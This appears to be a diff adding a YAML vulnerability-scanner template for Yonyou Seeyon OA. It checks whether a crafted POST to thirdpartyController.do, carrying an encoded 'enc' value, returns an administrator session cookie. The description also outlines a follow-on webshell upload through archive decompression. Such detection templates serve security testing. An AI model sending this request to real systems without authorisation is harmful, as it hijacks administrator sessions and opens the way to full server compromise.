@@ -1,0 +1,22 @@
+name: Seeyon_OA_administrator_cookie_leakage_file_upload
+transport: http
+set: {}
+detail:
+  dock: app="Yonyou-Seeyon-OA"
+  product: Yonyou-Seeyon-OA
+  homepage: https://www.seeyon.com/
+  impact: ''
+  description: Get the administrator cookie directly by request, By uploading a compressed
+    file, calling the interface to perform the file decompression, the exploit of
+    the decompression process will be exploited to obtain the webshell.
+rules:
+  r1:
+    method: POST
+    path: /seeyon/thirdpartyController.do
+    follow_redirects: true
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
+    expression: response.status == 200 && response.raw_header.bcontains(b'Set-Cookie')
+      && response.raw_header.bcontains(b'JSESSIONID')
+expression: r1()
